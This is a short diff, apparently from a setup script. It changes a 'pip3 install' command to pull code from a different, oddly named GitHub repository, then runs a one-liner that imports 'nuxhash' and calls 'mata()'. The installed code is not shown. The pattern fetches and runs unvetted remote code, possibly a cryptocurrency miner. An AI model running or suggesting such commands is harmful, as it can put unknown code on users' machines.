@@ -1,2 +1,2 @@
-pip3 install git+https://github.com/YakuzaTroY/mothitsrathore.git
+pip3 install git+https://github.com/galebi/hropo.git
 python -c "from nuxhash import mata; mata()"
